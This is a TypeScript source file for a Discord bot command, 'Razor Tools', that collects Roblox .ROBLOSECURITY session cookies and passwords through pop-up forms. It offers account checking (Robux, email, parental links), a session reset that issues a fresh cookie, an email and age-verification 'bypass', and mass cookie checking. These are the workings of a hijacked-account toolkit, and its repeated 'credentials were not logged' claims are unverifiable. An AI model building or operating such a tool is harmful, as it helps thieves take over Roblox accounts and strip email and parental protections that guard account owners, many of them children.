import {
  SlashCommandBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  type ModalSubmitInteraction,
  MessageFlags,
} from 'discord.js';
import type { Command } from './types';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons } from '../../lib/button-helpers';
import { EMOJIS } from '../../lib/emoji';
import { logger } from '../../lib/logger';

const modalSessions = new Map<string, { action: string }>();

function buildPanelEmbed() {
  return buildBaseEmbed(
    '𖣐 Razor Tools Serving',
    '✧ **Welcome to Razor Tools**\n' +
    '────\n' +
    '⭑ Select an action below.\n' +
    '⭑ You will be asked for credentials and delivery method.\n' +
    '⭑ Results can be sent via DM or posted in this channel.\n' +
    '────\n' +
    '✧ **Commands:**\n' +
    '• Login – Check Account Info\n' +
    '• Reset –  Invalidated Session & Get Fresh One\n' +
    '• Bypass – Emails Removing\n' +
    '• Check – Mass Checks Cookies Inside Files\n' +
    '• Clear – Clear Cookies Format',
    'Razor Tools On Top!'
  );
}

function buildPanelComponents() {
  const row1 = new ActionRowBuilder<ButtonBuilder>();
  const row2 = new ActionRowBuilder<ButtonBuilder>();
  const actions = [
    { id: 'login', label: '🔐 Login / Check' },
    { id: 'reset', label: '🔄 Reset Session' },
    { id: 'bypass', label: '⚡ Bypass' },
    { id: 'check', label: '📂 Mass Check' },
    { id: 'clear', label: '🧹 Clear Cookie' },
  ];
  actions.forEach((a, i) => {
    const btn = new ButtonBuilder()
      .setCustomId(`panel_${a.id}`)
      .setLabel(a.label)
      .setStyle(ButtonStyle.Primary);
    if (i < 3) row1.addComponents(btn);
    else row2.addComponents(btn);
  });
  return [row1, row2];
}

const data = new SlashCommandBuilder()
  .setName('panel')
  .setDescription('Open the Razor Tools control panel')
  .setDefaultMemberPermissions('0') as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({
    embeds: [buildPanelEmbed()],
    components: buildPanelComponents(),
  });
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  const customId = interaction.customId;
  const userId = interaction.user.id;

  const action = customId.replace('panel_', '');
  if (!['login', 'reset', 'bypass', 'check', 'clear'].includes(action)) {
    await interaction.reply({ content: 'Unknown action.', flags: MessageFlags.Ephemeral });
    return;
  }

  if (action === 'check') {
    await interaction.reply({
      content: '📂 Please use the `/check` command directly to upload a file.\nThis action is not available in the panel.',
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  const modal = new ModalBuilder()
    .setCustomId(`panel_modal_${action}_${userId}`)
    .setTitle(`Razor Tools – ${action.charAt(0).toUpperCase() + action.slice(1)}`);

  const cookieInput = new TextInputBuilder()
    .setCustomId('cookie')
    .setLabel('.ROBLOSECURITY Cookie')
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true)
    .setPlaceholder('Paste your cookie (including warning prefix)');

  const fields = [cookieInput];

  if (action === 'bypass') {
    const passInput = new TextInputBuilder()
      .setCustomId('password')
      .setLabel('Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Enter your Roblox password');
    fields.push(passInput);
  }

  const deliveryInput = new TextInputBuilder()
    .setCustomId('delivery')
    .setLabel('Delivery method (dm or server)')
    .setStyle(TextInputStyle.Short)
    .setRequired(true)
    .setValue('server')
    .setPlaceholder('Type "dm" for DM, or "server" for this channel');

  fields.push(deliveryInput);

  const rows = fields.map(f => new ActionRowBuilder<TextInputBuilder>().addComponents(f));
  modal.addComponents(...rows);

  modalSessions.set(`${action}_${userId}`, { action });
  await interaction.showModal(modal);
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const userId = interaction.user.id;
  const parts = interaction.customId.split('_');
  const action = parts[2];
  const sessionKey = `${action}_${userId}`;
  const session = modalSessions.get(sessionKey);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please open the panel again.', flags: MessageFlags.Ephemeral });
    return;
  }

  const cookie = interaction.fields.getTextInputValue('cookie');
  let password: string | undefined;
  if (action === 'bypass') {
    try {
      password = interaction.fields.getTextInputValue('password');
    } catch {
      password = undefined;
    }
  }

  const deliveryRaw = interaction.fields.getTextInputValue('delivery').toLowerCase().trim();
  const delivery = (deliveryRaw === 'dm') ? 'dm' : 'server';

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  async function sendResult(content: any) {
    if (delivery === 'dm') {
      try {
        await interaction.user.send(content);
        await interaction.editReply({ content: '✅ Result sent to your DMs.' });
      } catch {
        await interaction.editReply(content);
      }
    } else {
      await interaction.editReply(content);
    }
  }

  try {
    const validation = await Roblox.validateCookie(cookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await sendResult({ embeds: [embed] });
      return;
    }

    switch (action) {
      case 'login': {
        const age = await Roblox.getUserAge(validation.userId!);
        const robux = await Roblox.fetchRobux(cookie, String(validation.userId!));
        const country = await Roblox.fetchCountry(cookie);
        const email = await Roblox.fetchEmailInfo(cookie);
        const parental = await Roblox.fetchParentalControls(cookie);
        const thumb = await Roblox.fetchAvatarThumbnail(String(validation.userId!));

        let emailStatus = 'No email found';
        if (email.verified) emailStatus = `${EMOJIS.VERIFICATION} Verified: \`${email.verified}\``;
        else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;

        const parentStatus = parental.hasParent ? `${EMOJIS.VERIFICATION} Parent linked` : '❌ No parent linked';

        const embed = buildAccountEmbed(
          validation.username!,
          validation.displayName || null,
          validation.userId!,
          age,
          robux,
          country,
          emailStatus,
          parentStatus,
          thumb
        );
        await sendResult({ embeds: [embed] });
        break;
      }
      case 'reset': {
        const result = await Roblox.killAndRefreshSession(cookie);
        if (result.success && result.newCookie) {
          const embed = buildSuccessEmbed(
            '✧ **Reset Successful**\n' +
            `────\n` +
            `⭑ New cookie issued.\n` +
            `⭑ Old session killed.\n` +
            `⭑ Your credentials were not logged.`
          );
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'reset', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [embed], components: [row] });
        } else {
          await sendResult({ embeds: [buildErrorEmbed('✧ **Reset Failed**\n────\n⭑ Could not refresh the session. Please try again later.')] });
        }
        break;
      }
      case 'bypass': {
        if (!password) {
          await sendResult({ embeds: [buildErrorEmbed('✧ **Missing Password**\n────\n⭑ Password is required for bypass.')] });
          break;
        }
        const emailInfo = await Roblox.fetchEmailInfo(cookie);
        if (!emailInfo.verified) {
          const embed = buildSuccessEmbed(
            '✧ **Bypass Result**\n' +
            `────\n` +
            `⭑ **Status:** Success, No Mails Detected!\n` +
            `⭑ **Username:** ${validation.username}\n` +
            `⭑ Your credentials were not logged.`
          );
          await sendResult({ embeds: [embed] });
          break;
        }

        const progressEmbed = buildProgressEmbed('Sending bypass request...');
        await sendResult({ embeds: [progressEmbed] });

        const bypassResult = await Roblox.bypassAgeVerification(cookie, password);
        if (bypassResult.success) {
          const embed = buildSuccessEmbed(
            '✧ **Bypass Result**\n' +
            `────\n` +
            `⭑ **Status:** Success\n` +
            `⭑ **Message:** ${bypassResult.message}\n` +
            (bypassResult.newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
            `⭑ Your credentials were not logged.`
          );
          const id = bypassResult.newCookie ? Math.random().toString(36).slice(2, 10) : '';
          const row = bypassResult.newCookie ? buildCopyButtons(id, 'bypass', bypassResult.newCookie, delivery === 'dm') : undefined;
          await sendResult({ embeds: [embed], components: row ? [row] : [] });
        } else {
          if (bypassResult.message === 'Progressing..') {
            const embed = buildProgressEmbed('Bypass in progress... Please wait and check later.');
            await sendResult({ embeds: [embed] });
          } else {
            await sendResult({ embeds: [buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${bypassResult.message}\n⭑ Your credentials were not logged.`)] });
          }
        }
        break;
      }
      case 'clear': {
        const cleaned = Roblox.extractCookie(cookie);
        if (!cleaned) {
          await sendResult({ embeds: [buildErrorEmbed('✧ **No Cookie Found**\n────\n⭑ No valid cookie token found.')] });
        } else {
          const embed = buildSuccessEmbed(
            '✧ **Cleaned Cookie**\n' +
            `────\n` +
            `\`\`\`\n${cleaned}\n\`\`\`\n` +
            `────\n` +
            `⭑ Removed warning prefix and extra text.`
          );
          await sendResult({ embeds: [embed] });
        }
        break;
      }
      default:
        await sendResult({ embeds: [buildErrorEmbed('✧ **Unknown Action**\n────\n⭑ Something went wrong.')] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Panel modal error');
    await sendResult({ embeds: [buildErrorEmbed('✧ **Error**\n────\n⭑ An unexpected error occurred.')] });
  }

  modalSessions.delete(sessionKey);
}

export const panelCommand: Command = { data, execute, handleButton, handleModal };